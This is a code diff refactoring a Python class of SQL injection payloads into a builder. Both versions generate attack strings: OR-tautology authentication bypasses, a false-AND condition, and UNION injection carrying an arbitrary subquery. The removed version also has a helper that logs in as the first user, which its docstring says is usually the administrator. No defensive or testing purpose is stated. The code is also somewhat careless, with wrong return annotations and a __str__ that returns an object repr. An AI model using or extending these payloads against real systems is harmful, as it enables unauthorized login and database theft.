@@ -1,31 +1,33 @@
-class SQLInjectionInput:
-    def or_boolean_injection_quoted() -> None:
-        """
-        Useful for database condition checks
-        """
-        return f"\' OR 1=\"1\"; -- "
+from io import StringIO
 
-    def or_boolean_injection_unquoted() -> None:
-        """
-        Useful for database condition checks
-        """
-        return f"\' OR 1=1; -- "
 
-    def false_and_boolean_injection(subquery: str) -> None:
-        """
-        Useful for database checks and using another query
-        """
-        return f"\' AND 1=\"2\" {subquery}"
+class SQLInjectionBuilder:
+    def __init__(self) -> None:
+        self.injection_string = StringIO()
+        self.final_string = None
 
-    def union_injection(subquery: str) -> None:
-        return f"UNION {subquery} -- "
+    def _add(self, new_str:str):
+         return  self.injection_string.write(new_str)
 
-    def login_user(usr_id: int) -> None:
-        return f"\' or {usr_id}=\"{usr_id}\";-- "
+    def build(self):
+        self._add("; -- ")
+        self.injection_string.getvalue()
+        return self.injection_string.getvalue()
+    
+    def __str__(self) -> str:
+        if self.final_string == None:
+            return str(self.injection_string)
+        else:
+            return self.final_string
 
-    def login_admin() -> None:
-        """
-        Returns a possible way of getting to the first user on the database
-        It usually means the administrator of the database
-        """
-        return SQLInjectionInput.login_user(1)
+    def or_boolean_injection_quoted(self):
+        self._add("' OR 1=\"1\"")
+
+    def or_boolean_injection_unquoted(self):
+        self._add("' OR 1=1")
+
+    def false_and_boolean_injection(self) -> None:
+        self._add("' AND 1=\"2\"")
+
+    def union_injection(self, subquery: str) -> None:
+        self._add(f" UNION {subquery}")
